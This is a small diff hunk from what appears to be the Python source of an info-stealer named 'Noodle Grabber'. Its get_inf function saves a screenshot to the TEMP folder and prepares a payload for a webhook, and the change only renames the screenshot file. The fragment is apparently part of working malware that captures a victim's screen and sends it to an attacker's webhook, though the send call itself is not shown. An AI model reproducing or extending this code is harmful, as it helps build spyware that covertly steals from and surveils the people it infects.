@@ -5,7 +5,7 @@ import os
 
 def get_inf(webhook):
     temp_directory = os.environ.get('TEMP')
-    image_path = os.path.join(temp_directory, "screenshot.png")
+    image_path = os.path.join(temp_directory, "image.png")
 
     webhook_data = {
         "username": "Noodle Grabber",
